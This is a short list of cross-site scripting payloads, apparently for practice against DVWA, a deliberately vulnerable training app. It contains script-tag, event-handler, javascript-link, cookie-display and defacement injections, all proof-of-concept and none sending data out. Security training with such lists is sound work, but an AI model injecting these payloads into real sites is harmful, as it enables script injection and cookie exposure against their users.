# XSS Payloads — DVWA

<script>alert('XSS')</script>
<script>alert('You are hacked !!')</script>
<script>alert('Your data is breached !!')</script>
<img src=x onerror=alert(1)>
<body onload=alert('XSS')>
<script>alert(document.cookie)</script>
<script>document.write('<h1>HACKED</h1>')</script>
<marquee>HACKED</marquee>
<svg onload=alert(1)>
<input type="text" onfocus=alert(1) autofocus>
<a href="javascript:alert(1)">Click Me</a>